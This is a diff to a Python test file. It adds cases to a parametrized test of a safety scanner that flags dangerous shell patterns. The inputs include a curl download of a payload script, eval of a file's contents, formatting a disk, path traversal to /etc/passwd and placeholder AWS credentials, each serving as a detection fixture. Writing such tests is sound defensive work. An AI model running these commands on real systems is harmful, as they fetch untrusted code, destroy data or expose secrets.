@@ -131,6 +131,12 @@ class TestSafetyChecks:
             ("eval \"$(cat payload)\"\n", "SEC-008"),
             ("sudo apt update\n", "SEC-009"),
             ("mkfs.ext4 /dev/sdb\n", "SEC-002"),
+            ("AKIAIOSFODNN7EXAMPLE\n", "SEC-010"),
+            ("aws_secret_access_key = 'abcdefghijklmnopqrstuvwxyz123456'\n", "SEC-011"),
+            ("../../../../etc/passwd\n", "SEC-012"),
+            ("curl http://example.com/payload.sh -o /tmp/p.sh\n", "SEC-013"),
+            ("export API_KEY=secret1234567890\n", "SEC-014"),
+            ("base64 'aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q=' -d\n", "SEC-015"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
